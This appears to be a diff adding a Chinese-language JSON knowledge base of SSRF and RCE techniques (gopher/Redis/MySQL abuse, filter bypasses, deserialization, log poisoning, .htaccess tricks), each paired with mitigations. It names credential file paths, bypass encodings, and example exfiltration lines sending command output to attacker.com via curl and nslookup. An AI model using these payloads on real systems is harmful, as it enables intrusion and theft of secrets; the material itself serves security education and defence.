@@ -1,0 +1,142 @@
+﻿[
+    {
+        "id":  "ssrf-cloud-azure",
+        "ov":  "Azure云环境中的SSRF可访问IMDS(Instance Metadata Service, 169.254.169.254)获取管理身份的OAuth Token，进而访问Azure Key Vault密钥、存储账户、SQL数据库等云资源。",
+        "vu":  "Azure IMDS端点需要Metadata: true头。关键路径：/metadata/instance获取VM配置、/metadata/identity/oauth2/token获取Managed Identity的Access Token。该Token可用于调用Azure Resource Manager API管理所有授权资源。",
+        "ex":  "完整利用流程：\n1. 发现SSRF漏洞\n2. 添加Metadata头访问元数据\n3. 获取托管身份令牌\n4. 使用令牌访问Azure资源",
+        "mi":  "防御措施：\n1. 禁用托管身份（如不需要）\n2. 实施网络隔离\n3. 监控异常元数据访问\n4. 使用Azure防火墙规则"
+    },
+    {
+        "id":  "ssrf-protocol",
+        "ov":  "SSRF协议利用扩展了攻击面，除常见的http/https外，file://读取本地文件、gopher://构造任意TCP报文、dict://探测服务、ftp://访问FTP服务等协议极大增强了SSRF的利用能力。",
+        "vu":  "SSRF支持的危险协议：file://读取本地文件(file:///etc/passwd)、gopher://构造任意TCP数据包(可攻击Redis/MySQL/SMTP等内网服务)、dict://探测端口和服务指纹、ftp://访问内网FTP、ldap://查询目录服务。",
+        "ex":  "完整利用流程：\n1. 测试支持的协议\n2. 选择合适的协议\n3. 构造攻击payload\n4. 获取数据或执行命令",
+        "mi":  "防御措施：\n1. 白名单限制协议（仅HTTP/HTTPS）\n2. 禁用危险协议处理\n3. URL规范化验证\n4. 网络隔离"
+    },
+    {
+        "id":  "ssrf-gopher",
+        "ov":  "gopher://协议是SSRF利用中最强大的协议，可构造任意TCP报文内容，能模拟Redis/MySQL/SMTP/HTTP等多种协议的通信，是SSRF攻击内网服务实现RCE的关键技术。",
+        "vu":  "gopher://通过URL编码传递原始TCP数据：gopher://ip:port/_[url-encoded-data]。可构造Redis的SLAVEOF/CONFIG SET命令写webshell、MySQL认证包执行SQL语句、SMTP邮件发送、HTTP POST请求等，将SSRF升级为内网服务的任意操作。",
+        "ex":  "完整利用流程：\n1. 确认Gopher协议支持\n2. 构造目标服务协议数据\n3. URL编码payload\n4. 发送攻击请求",
+        "mi":  "防御措施：\n1. 禁用Gopher协议\n2. 白名单限制协议\n3. 网络隔离\n4. 监控异常请求"
+    },
+    {
+        "id":  "ssrf-dict",
+        "ov":  "dict://协议可向指定IP:端口发送单行文本，常用于SSRF中的端口扫描和服务指纹识别。虽然功能有限，但在gopher://不可用时是内网探测的有效替代方案。",
+        "vu":  "dict://协议向目标发送DICT协议命令(单行文本+CRLF)。利用方式：1)端口扫描(dict://ip:port/info检测端口开放) 2)Redis命令执行(dict://ip:6379/SET key value) 3)服务指纹(根据响应判断服务类型)。",
+        "ex":  "完整利用流程：\n1. 确认Dict协议支持\n2. 探测内网服务\n3. 发送恶意命令\n4. 获取数据或写入文件",
+        "mi":  "防御措施：\n1. 禁用Dict协议\n2. 白名单限制协议\n3. 内网服务认证\n4. 网络隔离"
+    },
+    {
+        "id":  "ssrf-file",
+        "ov":  "file://协议是SSRF中最基础的利用方式，可直接读取服务器本地文件系统上的任意文件。虽然简单，但在获取配置文件、源代码、密钥文件等敏感信息时极为有效。",
+        "vu":  "file://协议读取本地文件：file:///etc/passwd(用户列表)、file:///etc/shadow(密码哈希,需root权限)、file:///proc/self/environ(环境变量,可能包含密钥)、file:///root/.ssh/id_rsa(SSH私钥)。Windows下可读C:\\\\Windows\\\\win.ini等。",
+        "ex":  "完整利用流程：\n1. 确认File协议支持\n2. 探测敏感文件路径\n3. 读取配置文件获取凭据\n4. 利用凭据进一步渗透",
+        "mi":  "防御措施：\n1. 禁用File协议\n2. 白名单限制协议\n3. 文件权限控制\n4. 敏感文件加密存储"
+    },
+    {
+        "id":  "ssrf-bypass",
+        "ov":  "SSRF绕过技术针对应用层面的URL过滤措施(IP黑名单/白名单/域名限制)，通过IP编码变换、DNS重绑定、URL解析差异、重定向跳转等方式突破SSRF防护。",
+        "vu":  "SSRF过滤绕过方法：1)IP变形(0177.0.0.1/2130706433/0x7f000001) 2)IPv6(::1/::ffff:127.0.0.1) 3)DNS重绑定(域名解析切换) 4)URL解析差异(@符号/URL编码) 5)302重定向跳转 6)URL短链服务 7)进制转换 8)CNAME到内网IP。",
+        "ex":  "完整利用流程：\n1. 分析过滤规则\n2. 测试各种绕过技术\n3. 找到有效的绕过方法\n4. 访问内网资源",
+        "mi":  "防御措施：\n1. 解析后验证IP地址\n2. 禁止访问内网IP段\n3. 禁用重定向跟随\n4. 使用DNS解析验证"
+    },
+    {
+        "id":  "ssrf-dns-rebinding",
+        "ov":  "DNS重绑定攻击通过在两次DNS查询间改变域名解析结果(先解析为合法IP通过验证，再解析为内网IP发起请求)来绕过SSRF的域名/IP校验，是最隐蔽的SSRF绕过方式之一。",
+        "vu":  "DNS重绑定利用DNS TTL极低(0-1秒)的域名：第一次解析返回公网IP通过服务端URL验证，第二次解析(实际请求时)返回127.0.0.1或内网IP。可利用在线DNS重绑定服务(如rbndr.us/lock.cmpxchg8b.com)或自建DNS服务器。",
+        "ex":  "完整利用流程：\n1. 搭建或使用DNS重绑定服务\n2. 配置域名解析策略\n3. 使用该域名发起请求\n4. 绕过验证访问内网",
+        "mi":  "防御措施：\n1. 缓存DNS解析结果\n2. 使用IP地址而非域名验证\n3. 禁用DNS解析\n4. 网络层隔离"
+    },
+    {
+        "id":  "ssrf-redis",
+        "ov":  "SSRF攻击Redis是最经典的内网服务利用场景，通过gopher://协议向Redis发送命令，可写入WebShell、SSH公钥、Crontab定时任务等，从SSRF直接升级为服务器RCE。",
+        "vu":  "Redis默认无认证且监听0.0.0.0:6379。SSRF通过gopher://发送Redis命令：1)SET/CONFIG SET dir+dbfilename写WebShell到Web目录 2)写SSH公钥到/root/.ssh/authorized_keys 3)写Crontab反弹Shell 4)主从复制加载恶意模块(RCE)。",
+        "ex":  "完整利用流程：\n1. 通过SSRF探测Redis\n2. 写入WebShell\n3. 或写入SSH公钥\n4. 或写入Cron任务\n5. 获取服务器权限",
+        "mi":  "防御措施：\n1. Redis设置密码认证\n2. 绑定内网IP\n3. 禁用危险命令\n4. 网络隔离"
+    },
+    {
+        "id":  "ssrf-mysql",
+        "ov":  "SSRF攻击MySQL利用gopher://协议构造MySQL通信报文，在目标MySQL允许无密码本地连接时可执行任意SQL语句，读取敏感数据或通过INTO OUTFILE写入WebShell。",
+        "vu":  "MySQL认证允许本地空密码连接时(常见于开发环境)，SSRF通过gopher://发送MySQL协议数据包：1)认证握手报文 2)查询报文(SELECT/INSERT/INTO OUTFILE)。利用工具如Gopherus可自动生成URL编码的MySQL协议payload。",
+        "ex":  "完整利用流程：\n1. 确认MySQL服务\n2. 获取用户名\n3. 构造协议数据包\n4. 执行SQL命令\n5. 写入WebShell",
+        "mi":  "防御措施：\n1. MySQL设置强密码\n2. 禁止空密码登录\n3. 限制网络访问\n4. 禁用文件写入功能"
+    },
+    {
+        "id":  "rce-php",
+        "ov":  "PHP代码执行漏洞通过eval()/assert()/preg_replace(e修饰符)/array_map()等函数将用户输入作为PHP代码执行，可直接读取文件、操作数据库、执行系统命令等。",
+        "vu":  "PHP危险函数包括：eval()/assert()直接执行代码字符串、preg_replace()的e修饰符(PHP\u003c7)将替换结果作为代码执行、create_function()/call_user_func()动态函数调用、array_map()/usort()回调函数注入。",
+        "ex":  "完整利用流程：\n1. 发现代码执行点\n2. 构造恶意代码\n3. 执行系统命令\n4. 写入WebShell\n5. 获取服务器权限",
+        "mi":  "防御措施：\n1. 禁用危险函数\n2. 使用白名单验证输入\n3. 使用参数化调用\n4. 最小权限原则"
+    },
+    {
+        "id":  "rce-php-filter",
+        "ov":  "PHP Filter链RCE是2022年发现的新技术，通过精心组合多个php://filter过滤器(iconv字符集转换)，在不使用文件上传的情况下从无到有生成任意内容，配合include实现RCE。",
+        "vu":  "PHP Filter链利用iconv字符集转换过滤器的组合效应：通过特定的字符集转换序列(如UTF-7→UTF-8)逐字节构造任意PHP代码。一个LFI漏洞(include($_GET[\"file\"]))配合Filter链即可直接RCE，无需文件上传或日志投毒。",
+        "ex":  "完整利用流程：\n1. 发现文件包含漏洞\n2. 使用工具生成Filter链\n3. 构造恶意请求\n4. 执行任意代码",
+        "mi":  "防御措施：\n1. 禁用php://filter\n2. 白名单限制文件路径\n3. 禁用危险过滤器\n4. 升级PHP版本"
+    },
+    {
+        "id":  "rce-cmd-blind",
+        "ov":  "盲命令注入是指命令执行成功但结果不回显在响应中的场景，需要通过DNS外带(nslookup)、HTTP外带(curl)、延时判断(sleep)或写文件等间接方式确认漏洞存在和提取数据。",
+        "vu":  "盲命令注入的确认和利用方式：1)时间延迟(;sleep 5)判断执行 2)DNS外带(;nslookup $(whoami).attacker.com)获取命令输出 3)HTTP外带(curl http://attacker.com/$(cat /etc/hostname)) 4)写入Web目录后HTTP访问获取结果。",
+        "ex":  "完整利用流程：\n1. 确认命令注入存在（时间盲注）\n2. 使用外带通道获取数据\n3. 构造反弹Shell\n4. 获取服务器权限",
+        "mi":  "防御措施：\n1. 避免使用系统命令\n2. 使用参数化API\n3. 输入白名单验证\n4. 禁用危险函数"
+    },
+    {
+        "id":  "rce-deserialize",
+        "ov":  "反序列化漏洞是将不可信数据还原为对象时触发恶意操作，存在于Java/PHP/Python/.NET等多种语言中。攻击者构造特殊的序列化数据，在反序列化过程中自动调用危险方法实现RCE。",
+        "vu":  "反序列化攻击利用对象在还原时自动调用的魔术方法(如Java的readObject、PHP的__wakeup/__destruct)。通过POP(Property Oriented Programming)链将多个类的方法调用串联，最终触发命令执行。",
+        "ex":  "完整利用流程：\n1. 识别反序列化点\n2. 分析可用的Gadget链\n3. 生成恶意序列化数据\n4. 发送触发RCE",
+        "mi":  "防御措施：\n1. 避免反序列化不可信数据\n2. 使用白名单类限制\n3. 禁用危险Gadget\n4. 使用安全的序列化格式"
+    },
+    {
+        "id":  "rce-deserialize-php",
+        "ov":  "PHP反序列化利用unserialize()函数处理用户可控数据时触发魔术方法(__destruct/__wakeup/__toString等)，通过POP链调用system()/exec()等危险函数实现RCE。",
+        "vu":  "PHP反序列化利用链：unserialize()触发__wakeup()或反序列化后触发__destruct()，通过修改对象属性指向其他类的方法(POP链)，最终调用命令执行函数。常见利用框架包括Laravel(PendingBroadcast链)、Yii(BatchQueryResult链)等。",
+        "ex":  "完整利用流程：\n1. 找到unserialize调用点\n2. 分析可利用的类\n3. 构造POP链\n4. 生成序列化payload\n5. 发送触发RCE",
+        "mi":  "防御措施：\n1. 避免反序列化用户输入\n2. 使用json_encode替代\n3. 白名单类限制\n4. 禁用Phar"
+    },
+    {
+        "id":  "rce-deserialize-java",
+        "ov":  "Java反序列化是最具破坏力的漏洞类型之一，利用Apache Commons Collections/BeanUtils等库中的Gadget链，在ObjectInputStream.readObject()时触发任意代码执行。",
+        "vu":  "Java反序列化利用ysoserial等工具生成Gadget链：CommonsCollections系列(InvokerTransformer链)、CommonsBeanutils(BeanComparator链)、URLDNS(DNS探测)等。序列化数据(AC ED 00 05魔术字节)出现在Cookie/HTTP参数/JMX/RMI等位置。",
+        "ex":  "完整利用流程：\n1. 识别反序列化点\n2. 检测依赖库\n3. 选择合适的Gadget链\n4. 生成payload\n5. 发送触发RCE",
+        "mi":  "防御措施：\n1. 升级依赖库版本\n2. 使用ObjectInputFilter\n3. 白名单类限制\n4. 禁用反序列化"
+    },
+    {
+        "id":  "rce-file-upload",
+        "ov":  "文件上传RCE通过上传包含恶意代码的文件(WebShell)到服务器的Web可访问目录，然后通过HTTP请求访问该文件触发代码执行，是获取服务器权限最直接的方式之一。",
+        "vu":  "文件上传RCE的利用条件：1)服务器允许上传可执行文件(PHP/JSP/ASP) 2)上传目录在Web根目录下且可通过URL访问 3)服务器将上传文件以脚本方式解析。绕过手段包括后缀名变形、Content-Type篡改、路径穿越等。",
+        "ex":  "完整利用流程：\n1. 分析上传限制\n2. 选择绕过方法\n3. 上传WebShell\n4. 访问执行\n5. 获取服务器权限",
+        "mi":  "防御措施：\n1. 白名单验证扩展名\n2. 检查文件内容\n3. 重命名上传文件\n4. 存储到非Web目录\n5. 禁用执行权限"
+    },
+    {
+        "id":  "rce-include",
+        "ov":  "文件包含RCE将LFI/RFI漏洞升级为代码执行，通过包含日志文件、Session文件、/proc/self/environ、临时上传文件等方式注入并执行恶意PHP代码。",
+        "vu":  "文件包含RCE的多种利用路径：1)日志投毒(User-Agent注入PHP代码→包含access.log) 2)Session文件包含(注入代码到Session→包含/tmp/sess_xxx) 3)/proc/self/environ中的User-Agent 4)PHP临时上传文件竞争条件。",
+        "ex":  "完整利用流程：\n1. 发现文件包含点\n2. 注入恶意代码\n3. 包含恶意文件\n4. 执行系统命令\n5. 获取Shell",
+        "mi":  "防御措施：\n1. 白名单验证文件路径\n2. 禁用远程文件包含\n3. 禁用PHP伪协议\n4. 使用open_basedir限制"
+    },
+    {
+        "id":  "rce-log-poison",
+        "ov":  "日志投毒RCE是最可靠的LFI→RCE升级路径之一：向Web服务器日志注入PHP代码(通过请求头)，然后通过文件包含漏洞加载日志文件触发代码执行，适用于Apache/Nginx等主流Web服务器。",
+        "vu":  "日志投毒的注入点：1)Apache access.log中的User-Agent/Referer字段 2)Nginx access.log 3)错误日志error.log(故意触发包含不存在文件的错误) 4)FTP日志(vsftpd) 5)SSH日志(/var/log/auth.log)中的用户名字段。",
+        "ex":  "完整利用流程：\n1. 发现文件包含漏洞\n2. 确定日志文件路径\n3. 注入恶意代码到日志\n4. 包含日志文件\n5. 执行命令获取Shell",
+        "mi":  "防御措施：\n1. 限制日志文件访问\n2. 过滤日志中的特殊字符\n3. 禁用文件包含\n4. 使用open_basedir限制"
+    },
+    {
+        "id":  "rce-image",
+        "ov":  "图片RCE利用图片处理库(ImageMagick/GD/Pillow)的漏洞或特性在服务器处理上传图片时执行代码。ImageMagick的\"ImageTragick\"(CVE-2016-3714)是最著名的案例。",
+        "vu":  "ImageMagick利用delegate(委托处理器)执行外部命令：MVG格式中的push graphic-context指令、SVG中的xlink:href外部引用、ephemeral协议删除文件、MSL格式写入文件等。GD库的特定版本也存在堆溢出等漏洞。",
+        "ex":  "完整利用流程：\n1. 制作图片马\n2. 上传图片马\n3. 找到文件包含点\n4. 包含图片马执行代码\n5. 获取Shell",
+        "mi":  "防御措施：\n1. 检查文件完整内容\n2. 重绘图片去除恶意代码\n3. 禁用文件包含\n4. 存储到非Web目录"
+    },
+    {
+        "id":  "rce-htaccess",
+        "ov":  ".htaccess文件RCE通过上传或修改Apache的.htaccess配置文件，改变服务器对特定文件类型的处理方式(如将.jpg文件作为PHP解析)，或直接通过php_value注入PHP代码。",
+        "vu":  ".htaccess RCE方式：1)AddType application/x-httpd-php .jpg使图片文件被当作PHP解析 2)php_value auto_prepend_file配合php://input注入代码 3)SetHandler将目录所有文件作为PHP处理 4)php_flag engine配合.user.ini。",
+        "ex":  "完整利用流程：\n1. 上传恶意.htaccess\n2. 配置文件类型解析\n3. 上传伪装的WebShell\n4. 访问执行\n5. 获取服务器权限",
+        "mi":  "防御措施：\n1. 禁止上传.htaccess\n2. 禁用AllowOverride\n3. 白名单验证文件名\n4. 重命名上传文件"
+    }
+]
